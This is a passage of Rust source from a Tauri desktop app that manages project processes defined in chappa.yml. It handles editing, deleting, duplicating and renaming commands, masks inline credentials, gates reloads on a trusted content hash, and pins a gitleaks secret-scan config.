        .and_then(|p| p.process_overrides.as_ref());
    Ok(runtime
        .processes
        .iter()
        .map(|(name, p)| ProjectProcessDto::from_process(name, p, overrides))
        .collect())
}

/// Persistence: set or clear a notification level.
///
/// `process_name = None` targets the PROJECT default; `Some(name)` targets
/// that process's override. `level = None` CLEARS (removes the override /
/// resets the project field to `None` = 'all'). A `level` outside
/// `"all" | "important" | "none"` is an error and persists nothing.
///
/// Deliberately store-only: the pump keeps emitting raw events and filtering
/// happens at the UI decision function, so levels change with zero Rust
/// churn. Nothing here reaches into the registry.
#[tauri::command]
pub fn set_notification_level(
    projects: State<'_, Projects>,
    project_id: u32,
    process_name: Option<String>,
    level: Option<String>,
) -> Result<(), String> {
    let mut inner = projects.store()?;
    inner
        .store
        .as_mut()
        .unwrap()
        .set_notification_level(project_id, process_name.as_deref(), level)
}

// ---- chappa.yml write-back + chappa-side per-process toggles ------
//
// Every yml mutation goes through `project_model::writeback::apply` (fresh load
// → edit → one-time backup → concurrent-change re-hash → atomic write; a
// mid-flight external write refuses with `writeback::CHANGED_ON_DISK` and
// `refused_write` reloads immediately), then `after_own_write`: the
// trust hash follows the file when it was trusted before (the user made
// this edit), and the project reloads through the SAME diffing path the
// the chappa.yml watcher uses — so a mutation that only touches process B never
// restarts process A, and our own write echoing back through the watcher
// 500ms later is a no-op diff.

/// The editor's form (wire: camelCase). `working_dir` empty/blank = project
/// root; `env` keeps the row order the user typed (IndexMap end to end).
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ProcessDefDto {
    pub name: String,
    pub command: String,
    #[serde(default)]
    pub working_dir: Option<String>,
    #[serde(default = "default_true")]
    pub auto_start: bool,
    #[serde(default)]
    pub auto_restart: bool,
    #[serde(default)]
    pub restart_when_changed: Vec<String>,
    /// Ordered `[key, value]` pairs — NOT an object: Tauri deserializes
    /// arguments through `serde_json::Value`, whose map is a BTreeMap in this
    /// workspace (no `preserve_order`), so an object would arrive alphabetized
    /// and every save would reorder the file's env block.
    #[serde(default)]
    pub env: Vec<(String, String)>,
}

fn default_true() -> bool {
    true
}

impl ProcessDefDto {
    pub(crate) fn into_def(self) -> (String, ProcessDef) {
        // `UNCHANGED` markers pass through as values; `resolve_unchanged`
        // swaps the stored originals back in before anything is written.
        let working_dir = self
            .working_dir
            .map(|d| d.trim().to_owned())
            .filter(|d| !d.is_empty())
            .map(PathBuf::from);
        (
            self.name,
            ProcessDef {
                command: self.command.trim().into(),
                working_dir,
                auto_start: self.auto_start,
                auto_restart: self.auto_restart,
                restart_when_changed: self
                    .restart_when_changed
                    .into_iter()
                    .map(|g| g.trim().to_owned())
                    .filter(|g| !g.is_empty())
                    .collect(),
                env: self.env.into_iter().collect(),
                // Not editable here; `edit_process` carries the existing
                // value over, so an edit never strips a command's `source:`.
                source: None,
                unknown: IndexMap::new(),
            },
        )
    }
}

/// What the editor sends back for a masked value it did not replace: the
/// stored original is kept. The original never travels to the webview.
pub const UNCHANGED: &str = "\u{1}chappa:unchanged";

/// The command line as rows and the editor show it: secrets masked.
pub fn shown_command(command: &CommandLine) -> String {
    match command {
        CommandLine::Argv(words) => {
            project_model::words::join_words(&stack_core::credentials::mask_argv(words))
        }
        CommandLine::Shell(text) => stack_core::credentials::mask_line(text),
    }
}

/// One warning per command field of `chappa.yml` that looks like a
/// credential written inline: the file, the command and the field, never
/// the value.
pub fn inline_credential_warnings<'a>(
    defs: impl IntoIterator<Item = (&'a str, &'a ProcessDef)>,
) -> Vec<String> {
    defs.into_iter()
        .flat_map(|(name, def)| {
            masked_fields(def).into_iter().map(move |field| {
                format!(
                    "{}: command `{name}` field `{field}` looks like a credential written inline; {}",
                    project_model::yml::CHAPPA_YML_NAME,
                    stack_core::credentials::ADVICE
                )
            })
        })
        .collect()
}

/// Which of a definition's values are shown masked: `"command"` and each
/// masked env key. The editor offers a Replace field for each.
pub fn masked_fields(def: &ProcessDef) -> Vec<String> {
    let mut out = Vec::new();
    if shown_command(&def.command) != def.command.display() {
        out.push("command".to_owned());
    }
    for (k, v) in &def.env {
        if stack_core::credentials::mask_env(k, v) != *v {
            out.push(format!("env.{k}"));
        }
    }
    out
}

/// Put the stored originals back where the editor sent [`UNCHANGED`].
pub(crate) fn resolve_unchanged(
    def: &mut ProcessDef,
    existing: Option<&ProcessDef>,
) -> Result<(), String> {
    let missing = || {
        "a masked value was kept, but the command it belongs to is gone; enter it again".to_owned()
    };
    if def.command == CommandLine::Shell(UNCHANGED.to_owned()) {
        def.command = existing.ok_or_else(missing)?.command.clone();
    }
    for (k, v) in def.env.iter_mut() {
        if v == UNCHANGED {
            *v = existing
                .and_then(|e| e.env.get(k))
                .cloned()
                .ok_or_else(missing)?;
        }
    }
    Ok(())
}

/// `Edit command…` (`original_name = Some`) or `+ Add command` (`None`).
/// Returns the project's rows after the reload (empty when it is not open —
/// the file was still written).
///
/// The project file is unconditional — edits run through
/// `project_model::native::mutate` (store draft → validate → backwrite
/// chappa.yml, creating it on the first added command), then reload through
/// the diffing path.
#[tauri::command]
pub fn save_project_process(
    app: AppHandle,
    registry: State<'_, Registry>,
    projects: State<'_, Projects>,
    id: u32,
    original_name: Option<String>,
    def: ProcessDefDto,
) -> Result<Vec<ProjectProcessDto>, String> {
    let mut inner = projects.store()?;
    refuse_while_load_error(&inner, id)?;
    let (name, def) = def.into_def();
    // The project file is unconditional: the mutation drafts from
    // the store, validates, and backwrites chappa.yml, creating it on the
    // first added command. A concurrent-change or load-error refusal refuses
    // the WHOLE mutation with the store untouched (`mutate`), and `refused_write`
    // reloads the project when the refusal was a concurrent disk change.
    let was_trusted = trusted_snapshot(&inner, id);
    project_model::native::mutate(inner.store.as_mut().unwrap(), id, |defs| {
        let mut def = def;
        resolve_unchanged(
            &mut def,
            original_name.as_deref().and_then(|old| defs.get(old)),
        )?;
        match &original_name {
            Some(old) => project_model::native::edit_process(defs, old, &name, def),
            None => project_model::native::add_process(defs, &name, def),
        }
    })
    .map_err(|e| refused_write(&mut inner, &registry, &app, projects.arc(), id, e))?;
    // A rename is a key move in the file, so it is a key move
    // in the runtime too — the live terminal, panel and status carry across
    // under the new name instead of the reload reading remove+add and killing
    // the process. The chappa-side override record moves with it.
    if let Some(old) = original_name.as_deref().filter(|old| *old != name) {
        move_runtime_on_rename(&mut inner, id, old, &name);
    }
    after_own_write(&mut inner, &registry, &app, projects.arc(), id, was_trusted);
    Ok(process_dtos(&inner, id))
}

/// `Delete command "<name>"`. The project file is written FIRST — `mutate`
/// can still refuse (fresh load failed, name gone, backup/rename error) and a
/// refused delete must not have killed anything. Then the
/// running process, if any, is stopped under the lock (like `stop_process`),
/// and its chappa-side override record is pruned.
#[tauri::command]
pub fn delete_project_process(
    app: AppHandle,
    registry: State<'_, Registry>,
    projects: State<'_, Projects>,
    id: u32,
    name: String,
) -> Result<Vec<ProjectProcessDto>, String> {
    projects.delete_process(&app, &registry, id, &name)
}

impl Projects {
    /// The delete behind the editor's command and a record removal (a
    /// command record IS its definition). The command's record state and its
    /// run history go with it.
    pub fn delete_process(
        &self,
        app: &AppHandle,
        registry: &Registry,
        id: u32,
        name: &str,
    ) -> Result<Vec<ProjectProcessDto>, String> {
        let mut inner = self.store()?;
        refuse_while_load_error(&inner, id)?;
        let was_trusted = trusted_snapshot(&inner, id);
        project_model::native::mutate(inner.store.as_mut().unwrap(), id, |defs| {
            project_model::native::remove_process(defs, name)
        })
        .map_err(|e| refused_write(&mut inner, registry, app, self.arc(), id, e))?;
        // Refused deletes never reach here, so the process is only stopped once
        // the definition is actually gone — delete still stops a running process.
        stop_locked(&mut inner, registry, app, id, name);
        if let Some(record_id) = inner.store.as_ref().unwrap().command_record_id(id, name) {
            if let Err(e) = inner.ledger.delete_records(&[record_id]) {
                log::warn!("delete `{name}`: run history not pruned: {e}");
            }
        }
        if let Err(e) = inner
            .store
            .as_mut()
            .unwrap()
            .remove_process_override(id, name)
        {
            log::warn!("delete `{name}`: override record not pruned: {e}");
        }
        after_own_write(&mut inner, registry, app, self.arc(), id, was_trusted);
        Ok(process_dtos(&inner, id))
    }

    /// The frontend's start (a frames channel in hand) for a record start.
    pub fn start_with_frames(
        &self,
        app: &AppHandle,
        registry: &Registry,
        id: u32,
        name: String,
        frames: Channel<InvokeResponseBody>,
    ) -> Result<TermId, ControlError> {
        start_process(app, registry, self, id, name, frames)
    }
}

/// `Duplicate to ▸` (one name) / `Duplicate all commands to ▸` (`names`
/// EMPTY = every command of the source, read from the SOURCE's own regime — a
/// UI snapshot of names can lag an external edit and must not fail the whole
/// batch; review). Definitions are read FRESH from the source (the
/// project file when backed, the STORE when native-only) and written ONLY to
/// the target;
/// the source project is not touched. `target == source` is the same-project
/// copy (` copy` suffix). Returns the TARGET's rows when it is open (it
/// hot-reloads).
///
/// The write honors the TARGET project's own regime — sync ON
/// backwrites the yml, native-only mutates the target's STORE.
#[tauri::command]
pub fn duplicate_project_processes(
    app: AppHandle,
    registry: State<'_, Registry>,
    projects: State<'_, Projects>,
    source_id: u32,
    names: Vec<String>,
    target_id: u32,
) -> Result<Vec<ProjectProcessDto>, String> {
    let mut inner = projects.store()?;
    refuse_while_load_error(&inner, target_id)?;
    // Source = the store's defs (canonical between reads, refreshed by every
    // import and mutation). Definitions are written ONLY to the target.
    let source_processes = inner.store.as_ref().unwrap().process_defs(source_id);
    let names: Vec<String> = if names.is_empty() {
        source_processes.keys().cloned().collect()
    } else {
        names
    };
    let defs: Vec<(String, ProcessDef)> = names
        .iter()
        .map(|n| {
            source_processes
                .get(n)
                .map(|d| (n.clone(), d.clone()))
                .ok_or_else(|| format!("no command named `{n}` in project {source_id}"))
        })
        .collect::<Result<_, _>>()?;
    if defs.is_empty() {
        return Err("nothing to duplicate".to_owned());
    }
    let was_trusted = trusted_snapshot(&inner, target_id);
    // The write always backwrites the target's chappa.yml.
    project_model::native::mutate(inner.store.as_mut().unwrap(), target_id, |out| {
        for (name, repro) in &defs {
            project_model::native::duplicate_process(out, name, repro.clone())?;
        }
        Ok(())
    })
    .map_err(|e| refused_write(&mut inner, &registry, &app, projects.arc(), target_id, e))?;
    after_own_write(
        &mut inner,
        &registry,
        &app,
        projects.arc(),
        target_id,
        was_trusted,
    );
    Ok(process_dtos(&inner, target_id))
}

/// `Add to favorites` / its removal — projects.json only, NEVER the yml.
#[tauri::command]
pub fn set_process_favorite(
    projects: State<'_, Projects>,
    project_id: u32,
    process_name: String,
    favorite: bool,
) -> Result<(), String> {
    let mut inner = projects.store()?;
    inner
        .store
        .as_mut()
        .unwrap()
        .set_process_favorite(project_id, &process_name, favorite)
}

/// `Disable automatic renaming` — projects.json only, NEVER the yml. The
/// frontend reads the flag off the process DTO and drops OSC title events
/// for that process's terminal.
#[tauri::command]
pub fn set_process_auto_rename(
    projects: State<'_, Projects>,
    project_id: u32,
    process_name: String,
    disabled: bool,
) -> Result<(), String> {
    let mut inner = projects.store()?;
    inner
        .store
        .as_mut()
        .unwrap()
        .set_process_auto_rename_disabled(project_id, &process_name, disabled)
}

/// The project's override of "scan for secrets before launching an agent":
/// `true` / `false`, or `null` to follow the app setting. projects.json only.
#[tauri::command]
pub fn set_project_secret_scan(
    projects: State<'_, Projects>,
    project_id: u32,
    enabled: Option<bool>,
) -> Result<(), String> {
    let mut inner = projects.store()?;
    inner
        .store
        .as_mut()
        .unwrap()
        .set_secret_scan(project_id, enabled)
}

/// "Never write while a load error is outstanding." The write-back re-checks
/// by loading fresh; this is the early, cheaper refusal with the recorded
/// reason.
fn refuse_while_load_error(inner: &Inner, id: u32) -> Result<(), String> {
    match inner.runtimes.get(&id).and_then(|r| r.load_error.as_ref()) {
        Some(e) => Err(format!(
            "{} is not loadable, refusing to write: {e}",
            project_model::yml::CHAPPA_YML_NAME
        )),
        None => Ok(()),
    }
}

/// What the trusted content was made of, read before an own write so
/// `after_own_write` can carry trust across exactly that edit.
pub(crate) struct TrustSnapshot {
    /// The stack definitions as they were trusted.
    stacks: Vec<crate::stack_trust::StackSource>,
    /// The project's gitleaks config as it was trusted.
    scan: Option<ScanConfigSource>,
}

/// The parts of the content ON DISK right now when it is the trusted
/// content, `None` when it is not (or cannot be read).
fn trusted_snapshot(inner: &Inner, id: u32) -> Option<TrustSnapshot> {
    let store = inner.store.as_ref().unwrap();
    let root = store.get(id).map(|p| p.path.clone())?;
    let (yml, file_hash) = ProjectYml::load_result_with_hash(&root).ok()?;
    let stacks = crate::stack_trust::stack_sources(&root, &yml.processes);
    let scan = ScanConfigSource::of(&root, &yml);
    let hash = crate::stack_trust::project_trust_hash(&file_hash, &stacks, scan.as_ref());
    store
        .is_trusted(id, &hash)
        .then_some(TrustSnapshot { stacks, scan })
}

/// A refused write-back, before it propagates to the caller's modal: the
/// concurrent-change refusal (the guard in `writeback::apply`) additionally
/// fires the reload NOW — the watcher would catch the external edit
/// within its debounce anyway, but the rail should already show the file's
/// version when the "changed on disk" message is on screen. Other refusal
/// reasons (name clash, containment, load error) reload nothing.
fn refused_write(
    inner: &mut Inner,
    registry: &Registry,
    app: &AppHandle,
    projects: Arc<Mutex<Inner>>,
    id: u32,
    err: String,
) -> String {
    if err == writeback::CHANGED_ON_DISK {
        reload_locked(inner, registry, app, projects, id);
    }
    err
}

/// After a successful write-back: re-trust the new content when the old was
/// trusted (this edit is the user's own — re-arming the gate for it would be
/// noise), then reload through the diffing path. Reload failures are logged,
/// not propagated: the write succeeded and the watcher will retry.
fn after_own_write(
    inner: &mut Inner,
    registry: &Registry,
    app: &AppHandle,
    projects: Arc<Mutex<Inner>>,
    id: u32,
    was_trusted: Option<TrustSnapshot>,
) {
    trust_own_write(inner.store.as_mut().unwrap(), id, was_trusted.as_ref());
    reload_locked(inner, registry, app, projects, id);
}

/// The app's own write to a project whose content was trusted before is
/// trusted too (the user made it in the app); one to an untrusted project
/// stays untrusted, so the next reload still asks.
///
/// What is trusted is what the app WROTE (the content hash of the bytes it
/// wrote) together with the stack definitions and gitleaks config as they
/// were trusted before the write, never a fresh read of the folder: an
/// edit that lands on disk during the write (another writer, or an agent
/// changing a stack definition at that moment) is not trusted by it. When
/// the stack definitions the new commands name are not the ones the
/// snapshot holds (a command now names another stack, or a definition
/// changed meanwhile), nothing is carried over and the prompt asks.
fn trust_own_write(store: &mut ProjectStore, id: u32, was_trusted: Option<&TrustSnapshot>) {
    let Some(snapshot) = was_trusted else {
        return;
    };
    let (Some(root), Some(written)) = (
        store.get(id).map(|p| p.path.clone()),
        store.last_written(id).map(str::to_owned),
    ) else {
        return;
    };
    let defs = store.process_defs(id);
    let stacks_now = crate::stack_trust::stack_sources(&root, &defs);
    let same_stacks = stacks_now.len() == snapshot.stacks.len()
        && stacks_now
            .iter()
            .zip(&snapshot.stacks)
            .all(|(a, b)| a.name == b.name && a.hash() == b.hash());
    if !same_stacks {
        return;
    }
    let hash =
        crate::stack_trust::project_trust_hash(&written, &snapshot.stacks, snapshot.scan.as_ref());
    if store.mark_trusted(id, hash).is_ok() {
        let text = snapshot
            .scan
            .as_ref()
            .and_then(|s| s.text().map(str::to_owned));
        let _ = store.set_trusted_scan_config(id, text);
    }
}

/// A rename is a KEY MOVE in the process source, so it is a
/// key move in the runtime too — the live terminal, panel and status carry
/// across under the new name instead of the reload reading remove+add and
/// killing the process. The chappa-side override record moves with it under
/// the same lock. Used by `save_project_process` in BOTH sync regimes (the
/// move is source-agnostic).
fn move_runtime_on_rename(inner: &mut Inner, id: u32, old: &str, new: &str) {
    if old == new {
        return;
    }
    if let Some(runtime) = inner.runtimes.get_mut(&id) {
        if let Some(idx) = runtime.processes.get_index_of(old) {
            let (_, proc) = runtime.processes.shift_remove_index(idx).unwrap();
            runtime.processes.insert(new.to_owned(), proc);
            let last = runtime.processes.len() - 1;
            runtime.processes.move_index(last, idx);
        }
    }
    if let Err(e) = inner
        .store
        .as_mut()
        .unwrap()
        .rename_process_override(id, old, new)
    {
        log::warn!("rename `{old}` -> `{new}`: override record not moved: {e}");
    }
}

/// The stop half, callable while the caller already holds the lock. A
/// process that is not open / not live is a no-op (measured, 0.7.1).
fn stop_locked(inner: &mut Inner, registry: &Registry, app: &AppHandle, id: u32, name: &str) {
    let sources = inner.sources.clone();
    let Some(runtime) = inner.runtimes.get_mut(&id) else {
        return;
    };
    let root = runtime.root.clone();
    let Some(proc) = runtime.processes.get_mut(name) else {
        return;
    };
    let status = proc.lifecycle.on(ProcessEvent::Stop, now_ms());
    proc.generation += 1;
    if let Some(term_id) = proc.term_id.take() {
        registry.close(term_id);
        source_gone(&sources, &root, name, &proc.def, "was stopped");
    }
    let exit_code = proc.exit_code;
    inner.notify_changed();
    emit_status(app, id, name, status, exit_code, None);
}

/// Tell the source registry that a `source:` command's process is gone, so
/// its source reads "down" (payloads kept) until the next start. A no-op
/// for ordinary commands.
fn source_gone(sources: &Sources, root: &Path, name: &str, def: &ProcessDef, reason: &str) {
    if def.is_source() {
        sources.process_gone(root, name, reason);
    }
}

/// The `source:` commands among `before` that are no longer declared as
/// sources: `still_source(name)` is false (the command is gone, or kept
/// without the `source:` key). Each name once, in order.
fn undeclared_sources<'a>(
    before: impl IntoIterator<Item = (&'a str, &'a ProcessDef)>,
    still_source: impl Fn(&str) -> bool,
) -> Vec<String> {
    let mut gone: Vec<String> = Vec::new();
    for (name, def) in before {
        if def.is_source() && !still_source(name) && !gone.iter().any(|g| g == name) {
            gone.push(name.to_owned());
        }
    }
    gone
}

/// After a change to the project at `root` that stopped declaring the
/// launched sources `gone`: each leaves the registry, its kept record still
/// in force ([`Sources::undeclare_launched`]). When the content now loaded
/// is `trusted` (by hash, which includes the app's own writes to a project
/// that was trusted before), the records of every source it does not
/// declare go now ([`Sources::content_trusted`]; `declared` = its `source:`
/// commands); otherwise they wait for the trust answer.
fn settle_undeclared(
    sources: &Sources,
    root: &Path,
    gone: Vec<String>,
    trusted: bool,
    declared: &[String],
) {
    for name in gone {
        sources.undeclare_launched(root, &name);
    }
    if trusted {
        sources.content_trusted(root, declared);
    }
}

/// The rows of an OPEN project (empty when it is not open).
fn process_dtos(inner: &Inner, id: u32) -> Vec<ProjectProcessDto> {
    let Some(runtime) = inner.runtimes.get(&id) else {
        return Vec::new();
    };
    // No unwrap under the lock (the control surface reaches this too): an
    // uninitialized or already-removed store just means no overrides to fold in.
    let overrides = inner
        .store
        .as_ref()
        .and_then(|store| store.get(id))
        .and_then(|p| p.process_overrides.as_ref());
    runtime
        .processes
        .iter()
        .map(|(name, p)| ProjectProcessDto::from_process(name, p, overrides))
        .collect()
}

/// A never-started runtime for one definition (open + reload's "added").
fn fresh_runtime(root: &Path, def: ProcessDef) -> ProcessRuntime {
    let (watcher, watcher_rx) = watcher_for(root, &def);
    ProcessRuntime {
        def,
        lifecycle: Lifecycle::new(),
        term_id: None,
        exit_code: None,
        backoff: RestartBackoff::new(),
        channel: None,
        watcher,
        watcher_rx,
        watcher_started: false,
        spawned_at: Instant::now(),
        generation: 0,
        trusted_definition: None,
        scan_config: ProjectScanConfig::None,
    }
}

/// Remove secret-scan scratch a crashed scan left under each project's work
/// folder (hard links to scanned files), off the startup path.
fn sweep_scan_scratch(roots: Vec<PathBuf>) {
    std::thread::spawn(move || {
        for root in roots {
            let work = root.join(crate::secret_scan::WORK_DIR);
            let removed =
                stack_core::workdir::sweep_stale_scratch(&work, stack_core::workdir::STALE_AFTER);
            if !removed.is_empty() {
                log::info!(
                    "[secret-scan] removed {} stale scratch entries under {}",
                    removed.len(),
                    work.display()
                );
            }
        }
    });
}

/// Record the definition hashes of trusted content on the stack-runner
/// commands. The names of runners already live whose hash changed: the
/// caller starts them again so they run under the new one.
fn trust_stack_definitions(
    processes: &mut IndexMap<String, ProcessRuntime>,
    stacks: &[crate::stack_trust::StackSource],
) -> Vec<String> {
    let mut relaunch = Vec::new();
    for s in stacks {
        let Some(proc) = processes.get_mut(&s.name) else {
            continue;
        };
        let hash = s.runnable_hash();
        if proc.trusted_definition != hash {
            if is_live(proc) {
                relaunch.push(s.name.clone());
            }
            proc.trusted_definition = hash;
        }
    }
    relaunch
}

/// The project's own gitleaks config as the gates get it next: from what
/// is on disk (`now`) when the content is `trusted`; while it is not, a
/// config pinned before stays pinned at its old hash (the scans see the
/// file differ and fall back, with the banner), and anything else is named
/// as not used.
fn next_scan_pin(
    prev: &ProjectScanConfig,
    now: Option<&ScanConfigSource>,
    trusted: bool,
) -> ProjectScanConfig {
    match (trusted, prev) {
        (true, _) => now.map_or(ProjectScanConfig::None, |s| s.pinned(true)),
        (false, ProjectScanConfig::Trusted { .. }) => prev.clone(),
        (false, _) => now.map_or(ProjectScanConfig::None, |s| s.pinned(false)),
    }
}

/// Give every stack runner of the project `pin` for its next launch. The
/// names of live runners whose value changed: the caller starts them again.
fn pin_scan_config(
    processes: &mut IndexMap<String, ProcessRuntime>,
    pin: &ProjectScanConfig,
) -> Vec<String> {
    let mut relaunch = Vec::new();
    for (name, proc) in processes.iter_mut() {
        if !crate::stack_trust::is_stack_serve(&proc.def) || proc.scan_config == *pin {
            continue;
        }
        if is_live(proc) {
            relaunch.push(name.clone());
        }
        proc.scan_config = pin.clone();
    }
    relaunch
}

/// The text of the project's own config to keep with a trust record (for
/// the next prompt's diff), from what is on disk.
fn scan_config_text_on_disk(root: &Path) -> Option<String> {
    let yml = ProjectYml::load_result(root).ok()?;
    ScanConfigSource::of(root, &yml).and_then(|s| s.text().map(str::to_owned))
}

/// Trust `hash` for project `id` and keep the config text that goes with
/// it.
fn mark_trusted_with_config(
    store: &mut ProjectStore,
    id: u32,
    root: &Path,
    hash: String,
) -> Result<(), String> {
    store.mark_trusted(id, hash)?;
    store.set_trusted_scan_config(id, scan_config_text_on_disk(root))
}

/// A watcher on the project's own gitleaks config, reloading the project
/// (and so re-prompting) when it changes. `prev` is kept when it already
/// watches that file. `None` without an app (tests) or without a file to
/// watch.
fn scan_config_watcher_for(
    app: Option<AppHandle>,
    projects: Arc<Mutex<Inner>>,
    registry: Registry,
    id: u32,
    prev: Option<(PathBuf, RestartWatcher)>,
    pin: &ProjectScanConfig,
) -> Option<(PathBuf, RestartWatcher)> {
    let app = app?;
    let (path, _) = pin.args()?;
    if !path.is_absolute() {
        return None;
    }
    if let Some((p, w)) = prev {
        if p == path {
            return Some((p, w));
        }
    }
    let dir = path.parent()?.to_path_buf();
    let name = path.file_name()?.to_string_lossy().into_owned();
    let matcher = ChangeMatcher::new(dir.clone(), &[glob_literal(&name)]);
    let (watcher, rx) =
        RestartWatcher::start_with_mode(dir, matcher, RecursiveMode::NonRecursive).ok()?;
    start_yml_reload_consumer(projects, registry, app, id, rx);
    Some((path.to_path_buf(), watcher))
}

/// `name` as a glob matching only itself.
fn glob_literal(name: &str) -> String {
    name.chars()
        .map(|c| match c {
            '*' | '?' | '[' | ']' | '{' | '}' => format!("[{c}]"),
            c => c.to_string(),
        })
        .collect()
}

/// Whether `proc` is running (or starting) in a terminal.
fn is_live(proc: &ProcessRuntime) -> bool {
    proc.term_id.is_some()
        && matches!(
            proc.lifecycle.status(),
            ProcessStatus::Starting | ProcessStatus::Running
        )
}

/// The live stack runners of every open project, by project, in a stable
/// order.
fn live_stack_runners(runtimes: &HashMap<u32, ProjectRuntime>) -> Vec<(u32, Vec<String>)> {
    let mut out: Vec<(u32, Vec<String>)> = runtimes
        .iter()
        .map(|(id, rt)| {
            let names = rt
                .processes
                .iter()
                .filter(|(_, p)| crate::stack_trust::is_stack_serve(&p.def) && is_live(p))
                .map(|(n, _)| n.clone())
                .collect::<Vec<_>>();
            (*id, names)
        })
        .filter(|(_, names)| !names.is_empty())
        .collect();
    out.sort_by_key(|(id, _)| *id);
    out
}

/// The stack runners of an open project (`command` alone when named), with
/// the definition hash each was launched under.
fn stack_runners_of(
    rt: &ProjectRuntime,
    command: Option<&str>,
) -> Vec<(ProcessDef, Option<String>)> {
    rt.processes
        .iter()
        .filter(|(n, p)| {
            command.is_none_or(|c| c == n.as_str()) && crate::stack_trust::is_stack_serve(&p.def)
        })
        .map(|(_, p)| (p.def.clone(), p.trusted_definition.clone()))
        .collect()
}

/// [`Projects::stack_refusal`] over what it copied out: an open project's
/// runners are judged by the hash each was launched under; a project that
/// is not open by its stored trust (`is_trusted`) against what is on disk.
fn stack_refusal_of(
    root: &Path,
    open: Option<&[(ProcessDef, Option<String>)]>,
    command: Option<&str>,
    is_trusted: impl FnOnce(&str) -> bool,
) -> Option<String> {
    match open {
        Some(runners) => runners
            .iter()
            .find_map(|(def, trusted)| crate::stack_trust::refusal(root, def, trusted.as_deref())),
        None => {
            let (yml, file_hash) = ProjectYml::load_result_with_hash(root).ok()?;
            let stacks = crate::stack_trust::stack_sources(root, &yml.processes);
            if !stacks.iter().any(|s| command.is_none_or(|c| c == s.name)) {
                return None;
            }
            let hash = crate::stack_trust::project_trust_hash(
                &file_hash,
                &stacks,
                ScanConfigSource::of(root, &yml).as_ref(),
            );
            (!is_trusted(&hash)).then(|| crate::stack_trust::UNTRUSTED_REFUSAL.to_owned())
        }
    }
}

/// Start the named live processes again (a stack runner whose trusted
/// definition changed). Callers hold the lock.
fn relaunch_locked(
    inner: &mut Inner,
    registry: &Registry,
    app: &AppHandle,
    projects: Arc<Mutex<Inner>>,
    id: u32,
    names: &[String],
) {
    let Some(root) = inner.runtimes.get(&id).map(|r| r.root.clone()) else {
        return;
    };
    let settings = inner.launch_settings();
    for name in names {
        let record = begin_command_run(inner, id, name);
        let sources = inner.sources.clone();
        let Some(proc) = inner
            .runtimes
            .get_mut(&id)
            .and_then(|r| r.processes.get_mut(name))
        else {
            continue;
        };
        proc.lifecycle.on(ProcessEvent::Stop, now_ms());
        proc.generation += 1;
        if let Err(e) = spawn_process(
            registry,
            app,
            projects.clone(),
            &sources,
            id,
            name,
            root.clone(),
            &settings,
            proc,
            record,
        ) {
            log::warn!(
                "`{name}` did not start again under its newly trusted stack definition: {e}"
            );
            proc.lifecycle.on(ProcessEvent::SpawnFailed, now_ms());
            emit_status(app, id, name, ProcessStatus::Failed, None, proc.term_id);
        }
    }
    if !names.is_empty() {
        inner.notify_changed();
    }
}

/// Emit `project://yml_reloaded` — the frontend re-fetches the rows on
/// `error: null`, or shows the reason and disables mutations otherwise.
fn emit_reloaded(
    app: &AppHandle,
    project_id: u32,
    error: Option<&str>,
    trust_pending: bool,
    trust_commands: &[String],
    trust_hash: &str,
) {
    let _ = app.emit(
        "project://yml_reloaded",
        &serde_json::json!({
            "project_id": project_id,
            "error": error,
            "trust_pending": trust_pending,
            "trust_commands": trust_commands,
            "trust_hash": trust_hash,
        }),
    );
}

/// Reload one open project, applying the diff:
/// - parse failure (SYNC only) → `load_error` set, nothing restarted, nothing
///   removed;
/// - removed → stopped and dropped;
/// - added → fresh (never started) runtime;
/// - changed spawn inputs → def replaced, restart_when_changed watcher
///   rebuilt, and — only if LIVE — restarted in place (same term id and
///   frames channel, the auto_restart respawn path);
/// - policy-only change (`auto_start`/`auto_restart`/unknown keys) → def
///   replaced, process left running;
/// - untouched → untouched. Order follows the source.
///
/// The process SOURCE follows the sync regime. Sync ON loads (and
/// trusts) the project file — the trust gate guards
/// imported auto-start/command changes. Native-only loads from the STORE, never the
/// yml: there is no trust gate (the store is the user's own edits by
/// construction) and no yml watcher, so `trusted` is always true and a store
/// read can never fail to load.
fn reload_locked(
    inner: &mut Inner,
    registry: &Registry,
    app: &AppHandle,
    projects: Arc<Mutex<Inner>>,
    id: u32,
) {
    let Some(root) = inner.runtimes.get_mut(&id).map(|r| {
        // Something in the project changed; its worktree list may have too.
        r.worktrees = None;
        r.root.clone()
    }) else {
        return;
    };
    let settings = inner.launch_settings();
    // The process source is chappa.yml, always — load it, hash it,
    // and gate on trust.
    let (yml, file_hash) = match ProjectYml::load_result_with_hash(&root) {
        Ok(loaded) => loaded,
        Err(e) => {
            if let Some(runtime) = inner.runtimes.get_mut(&id) {
                runtime.load_error = Some(e.clone());
            }
            emit_reloaded(app, id, Some(&e), false, &[], "");
            return;
        }
    };
    let stacks = crate::stack_trust::stack_sources(&root, &yml.processes);
    let scan = ScanConfigSource::of(&root, &yml);
    let new_hash = crate::stack_trust::project_trust_hash(&file_hash, &stacks, scan.as_ref());
    let trust_hash = new_hash.clone();
    // Trust is per CONTENT HASH, not a one-time
    // gate at open. Content we have not confirmed — an external edit, an
    // editor, a git pull — must never be EXECUTED by a reload; the gate
    // re-arms instead.
    let trusted = inner.store.as_ref().unwrap().is_trusted(id, &new_hash);
    let new_defs = yml.processes;
    let mut held_back: Vec<String> = Vec::new();
    let runtime = inner.runtimes.get_mut(&id).unwrap();
    runtime.load_error = None;
    runtime.yml_hash = new_hash;
    let mut old = std::mem::take(&mut runtime.processes);
    let old_defs: IndexMap<String, ProcessDef> = old
        .iter()
        .map(|(n, p)| (n.clone(), p.def.clone()))
        .collect();
    let diff = writeback::diff_processes(&old_defs, &new_defs);
    let undeclared = undeclared_sources(old_defs.iter().map(|(n, d)| (n.as_str(), d)), |name| {
        new_defs.get(name).is_some_and(ProcessDef::is_source)
    });
    let declared: Vec<String> = new_defs
        .iter()
        .filter(|(_, d)| d.is_source())
        .map(|(n, _)| n.clone())
        .collect();

    let mut processes = IndexMap::new();
    for (name, def) in new_defs {
        let proc = match old.shift_remove(&name) {
            None => fresh_runtime(&root, def),
            Some(mut proc) => {
                if diff.changed.contains(&name) {
                    proc.def = def;
                    // New patterns → new watcher. The old consumer thread ends
                    // when the old watcher drops; the next spawn arms a new one.
                    proc.watcher = None;
                    proc.watcher_rx = None;
                    proc.watcher_started = false;
                    let (watcher, rx) = watcher_for(&root, &proc.def);
                    proc.watcher = watcher;
                    proc.watcher_rx = rx;
                    let live = proc.term_id.is_some()
                        && matches!(
                            proc.lifecycle.status(),
